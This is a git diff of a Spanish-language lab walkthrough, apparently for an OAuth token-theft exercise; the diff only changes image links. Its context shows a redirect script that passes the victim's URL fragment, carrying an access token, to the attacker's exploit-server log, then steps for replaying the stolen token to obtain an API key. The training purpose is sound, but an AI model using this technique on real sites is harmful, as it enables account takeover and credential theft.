@@ -18,11 +18,11 @@ Entonces ahora necesitamos redirigir a la victima para eso vamos a crearnos un s
         window.location = '/?'+ document.location.hash.substr(1);
     }
 </script>)
-![Pasted_image_20250830185131.png](Imagenes/Pasted_image_20250830185131.png)
+![Pasted_image_20250830185131.png](/Imagenes/Pasted_image_20250830185131.png)
 le damos store y le damos acces log
-![Pasted_image_20250830185229.png](Imagenes/Pasted_image_20250830185229.png)
+![Pasted_image_20250830185229.png](/Imagenes/Pasted_image_20250830185229.png)
 copias el ultimo access_token
 dentro del repeater en la seccion de /me lo modificamos en la parte que dice authorization y le damos send
-![Pasted_image_20250830185311.png](Imagenes/Pasted_image_20250830185311.png)
+![Pasted_image_20250830185311.png](/Imagenes/Pasted_image_20250830185311.png)
 de modo que nos dara la api key y con esa la copiamos y pegamos en el laboratorio
-![Pasted_image_20250830185356.png](Imagenes/Pasted_image_20250830185356.png)
+![Pasted_image_20250830185356.png](/Imagenes/Pasted_image_20250830185356.png)
